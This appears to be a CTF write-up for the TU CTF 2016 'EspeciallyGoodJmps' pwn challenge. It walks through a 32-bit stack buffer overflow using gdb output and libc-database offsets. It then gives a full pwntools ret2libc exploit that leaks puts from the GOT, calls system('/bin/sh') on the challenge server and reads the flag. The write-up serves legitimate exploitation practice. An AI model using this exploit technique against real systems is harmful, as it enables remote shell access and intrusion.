{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2016\"></a>\n<a href=\"type=exploit\"></a>\n<a href=\"tags=buffer%20overflow\"></a>\n<a href=\"tools=libc-database\"></a>\n<a href=\"techniques=ret2libc\"></a></p>\n<h1>EspeciallyGoodJmps (pwn-75)</h1>\n<h3>Description</h3>\n<blockquote>\n<p>Pop a shell.</p>\n</blockquote>\n<blockquote>\n<p>Binary is hosted at: 130.211.202.98:7575</p>\n</blockquote>\n<blockquote>\n<p>EDIT:</p>\n</blockquote>\n<blockquote>\n<p>ASLR is enabled on remote server.</p>\n</blockquote>\n<p><code>bash $ file 23e4f31a5a8801a554e1066e26eb34745786f4c4 23e4f31a5a8801a554e1066e26eb34745786f4c4: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=afcb1c16b8d5a795af98824aaede8fabc045d4ed, not stripped</code></p>\n<p>`<code></code>bash\n$ checksec --file 23e4f31a5a8801a554e1066e26eb34745786f4c4\nRELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE\nPartial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   23e4f31a5a8801a554e1066e26eb34745786f4c4</p>\n<p>`<code></code>\nRunning the program in gdb shows that basic buffer overflow is there.</p>\n<p>`<code></code>bash\ngdb-peda$ r\nStarting program: /tmp/23e4f31a5a8801a554e1066e26eb34745786f4c4\nWhat's your name?\nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\nWhat's your favorite number?\n1\nHello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA, 1 is an odd number!</p>\n<p>Program received signal SIGSEGV, Segmentation fault.\n[----------------------------------registers-----------------------------------]\nEAX: 0x0\nEBX: 0xf7fa6000 --> 0x1a8da8\nECX: 0xf7fa7878 --> 0x0\nEDX: 0x0\nESI: 0x0\nEDI: 0x0\nEBP: 0x41414141 ('AAAA')\nESP: 0xffffd490 ('A' &#x3C;repeats 39 times>)\nEIP: 0x41414141 ('AAAA')\nEFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)\n[-------------------------------------code-------------------------------------]\nInvalid $PC address: 0x41414141\n[------------------------------------stack-------------------------------------]\n0000| 0xffffd490 ('A' &#x3C;repeats 39 times>)\n0004| 0xffffd494 ('A' &#x3C;repeats 35 times>)\n0008| 0xffffd498 ('A' &#x3C;repeats 31 times>)\n0012| 0xffffd49c ('A' &#x3C;repeats 27 times>)\n0016| 0xffffd4a0 ('A' &#x3C;repeats 23 times>)\n0020| 0xffffd4a4 ('A' &#x3C;repeats 19 times>)\n0024| 0xffffd4a8 ('A' &#x3C;repeats 15 times>)\n0028| 0xffffd4ac ('A' &#x3C;repeats 11 times>)\n[------------------------------------------------------------------------------]\nLegend: code, data, rodata, value\nStopped reason: SIGSEGV\n0x41414141 in ?? ()\n`<code></code>\nSo yeah overflow the buffer into saved eip and get a shell from shellcode as no NX means we can keep shellcode on the stack.</p>\n<p>But ASLR is enabled, so locating shellcode on the stack might be a pain. There are many approches to pwn it, mine was rather complicated than other exploits I saw after the CTF.</p>\n<p>So, first leak an address from libc by reading GOT entry for puts() i.e. call puts(GOT[puts]).Once I have a libc's leaked address I'll find the version using <a href=\"https://github.com/niklasb/libc-database\">libc-database</a>. <a href=\"https://github.com/niklasb/libc-database\">libc-database</a> can find versions of libc just by the LSB of the leak. We find by the leak that its LSB is 0xc10.</p>\n<p><code>bash $ ./find puts c10 ubuntu-trusty-amd64-libc6-i386 (id libc6-i386_2.19-0ubuntu6.6_amd64) ubuntu-trusty-amd64-libc6-i386 (id libc6-i386_2.19-0ubuntu6.7_amd64) $ ./dump libc6-i386_2.19-0ubuntu6.7_amd64 offset___libc_start_main_ret = 0x19a63 offset_system = 0x0003fcd0 offset_dup2 = 0x000d9dd0 offset_read = 0x000d9490 offset_write = 0x000d9510 offset_str_bin_sh = 0x15da84 $ ./dump libc6-i386_2.19-0ubuntu6.6_amd64 offset___libc_start_main_ret = 0x19a63 offset_system = 0x0003fcd0 offset_dup2 = 0x000d9dd0 offset_read = 0x000d9490 offset_write = 0x000d9510 offset_str_bin_sh = 0x15da84</code></p>\n<p>So we have 2 candidates and both have same offsets. Now we can easily calculate the offsets for system() and \"/bin/sh\" in libc once we have leaked address from GOT[puts]</p>\n<p>First I leak libc's address and then redirect the flow to main() to get control after the leak.\nThen I call system(\"/bin/sh\") using the libc's version and leaked address.</p>\n<p><a href=\"/23e4f31a5a8801a554e1066e26eb34745786f4c4-c3d92322d37d78ef0156944fce2fab93.py\">the exploit</a></p>\n<p>`<code></code>python\nfrom pwn import *</p>\n<p>offset<em>__libc</em>start<em>main</em>ret = 0x19a63\noffset<em>system = 0x0003fcd0\noffset</em>dup2 = 0x000d9dd0\noffset<em>read = 0x000d9490\noffset</em>write = 0x000d9510\noffset<em>str</em>bin<em>sh = 0x15da84\noffset</em>puts = 0x64c10</p>\n<p>got<em>puts = 0x804a018\n'''$ readelf -r ./23e4f31a5a8801a554e1066e26eb34745786f4c4 | grep puts\n0804a018  00000407 R</em>386<em>JUMP</em>SLOT   00000000   puts'''</p>\n<p>addr_main = 0x804851d</p>\n<p>pop_ret = 0x0804839d</p>\n<p>pad = 'A'*44</p>\n<p>payload = pad + p32(0x080483e6) + p32(pop<em>ret) + p32(got</em>puts) + p32(addr<em>main) + p32(addr</em>main)\ns = remote('130.211.202.98',7575)</p>\n<p>s.recvline()\ns.sendline(payload)</p>\n<p>s.recvline()\ns.send(\"1\\n\")\ns.recvline()</p>\n<p>t=s.recv(4)\nputs_leak=u32(t)\ns.recvline()</p>\n<p>payload1 = pad + p32(puts<em>leak - offset</em>puts + offset<em>system) + p32(pop</em>ret) + p32(puts<em>leak - offset</em>puts + offset<em>str</em>bin_sh)</p>\n<p>s.sendline(payload1)\ns.interactive()\n`<code></code></p>\n<p>gives us</p>\n<p>`<code></code>bash\n[+] Opening connection to 130.211.202.98 on port 7575: Done</p>\n<p>[*] Switching to interactive mode\n$ ls\neasy\nflag.txt\n$ cat flag.txt\nTUCTF{th0se<em>were</em>s0me<em>ESPecially</em>good_JMPs}\n`<code></code></p>","relativePath":"writeups/tu-ctf-2016/pwn/especiallygoodjmps/sudhackar"}}